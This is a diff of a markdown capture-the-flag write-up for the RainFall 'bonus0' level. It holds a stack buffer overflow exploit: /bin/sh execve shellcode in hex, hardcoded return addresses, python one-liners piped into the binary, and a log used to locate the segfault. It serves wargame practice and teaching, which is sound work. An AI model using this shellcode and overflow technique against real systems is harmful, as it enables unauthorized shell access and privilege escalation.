@@ -7,44 +7,47 @@ Here is our shellcode (size 24)
 ### Payload
 
 0xbffff71c --> address of v3 --> \x1c\xf7\xff\xbf
-0xbffff70e --> address of buffer -> \x0e\xf7\xff\xbf 
+0xbffff70e --> address of buffer -> \x0e\xf7\xff\xbf
 0xbffff74e --> address of buffer maybe wtf lol mdr --> \x4e\xf7\xff\xbf
 
 ```bash
 (python -c 'print ("A" * 20)'; cat) | ./bonus0
 ```
 
-```bash
+````bash
 (python -c 'print "A" * 20'; python -c 'print "B" * 19')  | ./bonus0```
 
 ```bash
 (python -c 'print "A" * 20'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xf7\xff\xbf"')  | ./bonus0
-```
+````
 
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0 --> 1ere partie shellcode
-\x0b\xcd\x80  --> 2eme partie shellcode
-'A' * 13
+\x0b\xcd\x80 --> 2eme partie shellcode
+'A' \* 13
 \x0e\xf7\xff\xbf
 
-
 ```bash
-(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 13 + "\x4e\xf7\xff\xbf"'; cat)  | ./bonus0
+(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 11 + "\x4e\xf7\xff\xbf" + "A"'; cat)  | ./bonus0
 ```
+
+run < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 12 + "\x4e\xf7\xff\xbf" + "A"';)
+
 LOG pour find segfault
 
 ```bash
 bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
- - 
- - 
+ -
+ -
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB
 Segmentation fault (core dumped)
 bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 16')  | ./bonus0
- - 
- - 
+ -
+ -
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
 ```
 
 Payload
 20 chars de payload
-+ 16 chars de payload
-+ overwrite return addresse --> jump vers debut de buffer (start of payload)
+
+- 16 chars de payload
+- overwrite return addresse --> jump vers debut de buffer (start of payload)
